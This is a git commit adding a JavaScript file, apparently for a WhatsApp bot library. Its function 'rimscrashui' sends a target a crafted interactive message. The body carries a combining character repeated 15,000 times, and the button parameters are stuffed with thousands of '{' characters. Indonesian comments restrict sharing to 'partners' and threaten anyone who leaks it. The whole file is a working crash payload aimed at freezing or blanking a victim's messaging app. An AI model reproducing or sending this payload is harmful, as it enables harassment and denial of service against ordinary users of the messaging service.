c2df731c2cb94846b04bd9b3dd8b64741689a47f
taufiq461 <topektopek4674@gmail.com>
2025-10-02 19:07:07 +0800

    Add files via upload

---
+++ BlankUiRims.js
@@ -0,0 +1,47 @@
+/* 
+Function Crashui Create By @GyzenVtx Khusus Patner
+Rules :
+• No Share Function Ke Own/Tk/PT Lu
+• No Sebar Function Secara Free
+Melanggar? Gw Bl + Kick Lu Bangsat
+*/
+
+async function rimscrashui(target) {
+let message = {
+viewOnceMessage: {
+message: {
+messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2, },
+interactiveMessage: {
+contextInfo: {
+mentionedJid: [target],
+isForwarded: true,
+forwardingScore: 99999999,
+businessMessageForwardInfo: {
+businessOwnerJid: target,
+},
+},
+body: { text: "floare Rims🤬😈" + "⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟".repeat(15000), },
+nativeFlowMessage: { messageParamsJson: "{".repeat(15000),
+buttons: [
+{ name: "single_select", ParamsJson: "{".repeat(15000), version: 3 },
+{ name: "call_permission_request", ParamsJson: "{".repeat(15000), version: 3 },
+{ name: "cta_url", ParamsJson: "{".repeat(15000), version: 3 },
+{ name: "cta_call", ParamsJson: "{".repeat(15000), version: 3 },
+{ name: "cta_copy", ParamsJson: "{".repeat(15000), version: 3 },
+{ name: "cta_reminder", ParamsJson: "{".repeat(15000), version: 3 },
+{ name: "cta_cancel_reminder", ParamsJson: "{".repeat(15000), version: 3 },
+{ name: "address_message", ParamsJson: "{".repeat(15000), version: 3 },
+{ name: "send_location", ParamsJson: "{".repeat(15000), version: 3 },
+{ name: "quick_reply", ParamsJson: "{".repeat(15000), version: 3 },
+{ name: "mpm", ParamsJson: "{".repeat(10000), version: 3 },
+],
+},
+},
+},
+},
+};
+await rims.relayMessage(target, message, { participant: { jid: target }, } ); }
+
+/*
+ JIKA MELIHAT ORNG/PT SAYA YG MENYEBABKAN FUNCTION INI MOHON LAPORKAN SAYA ( @GyzenVtx ), Lu Bakal Gw Kasih 1 Function Privat Gw Jika Melaporkan Jika Patner Gw Ada Yg Nyebar Function Ini 
+*/
